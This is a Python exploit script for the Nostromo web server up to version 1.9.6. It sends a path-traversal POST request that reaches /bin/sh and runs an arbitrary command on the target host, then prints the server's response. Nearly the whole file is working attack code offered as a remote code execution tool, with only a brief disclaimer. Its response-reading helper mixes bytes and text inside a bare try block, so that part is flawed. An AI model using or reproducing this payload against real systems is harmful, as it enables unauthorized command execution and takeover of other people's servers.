#!/usr/bin/env python3

from sys import version_info
if version_info < (3, 6):
        print("Error: python version less than 3.6\nPlease use python 3.6 or higher")
        exit(1)

"""
This exploit covers nostromous <= 1.9.6
I am not responsible for misuse of this program.
Please use Python 3.6 or above. Thank you!

- redxe
"""

import argparse
from io import StringIO
import socket


parser = argparse.ArgumentParser(description="Nostromo 1.9.6 - Remote Code Execution Tool")
parser.add_argument('ip_address', type=str)
parser.add_argument('port', type=int)
parser.add_argument('command', nargs=argparse.REMAINDER)


title = """
█▄░█ █▀█ █▀ ▀█▀ █▀█ █▀█ █▀▄▀█ █▀█ █░█ █▀  redxe
█░▀█ █▄█ ▄█ ░█░ █▀▄ █▄█ █░▀░█ █▄█ █▄█ ▄█  30-05-2020
"""


def connect(sock:socket.socket) -> str:
    buffer: StringIO = StringIO()
    try:
        while True:
            connection: bytes = sock.recv(0x400)
            if connection.__len__():
                buffer.write(connection)
            else:
                break
    except:
        pass
    return buffer.getvalue()


def nostromous(target: str, port: int, command: str):
    sock: socket.socket = socket.socket()
    print("[!] CONNECTING TO {0} ON PORT {1}".format(target, port))
    sock.connect((target, port))
    payload: str = 'POST /.%0d./.%0d./.%0d./.%0d./bin/sh HTTP/1.0\r\nContent-Length: ' \
                   '1\r\n\r\necho\necho\n{0} 2>&1'.format(command)
    print("[!] EXECUTING PAYLOAD")
    print("[*] {0}".format(payload.encode()))
    sock.send(payload.encode())
    print("\n[!] OPEN FOR RESPONSE")
    response: str = connect(sock)
    print('[@] {0}'.format(response) if response else '[@] NO DATA RECEIVED')


if __name__ == '__main__':
    print(title)
    args = parser.parse_args()
    if not args.command:
        print("Error: no command specified.")
    else:
        nostromous(args.ip_address, args.port, " ".join(args.command))
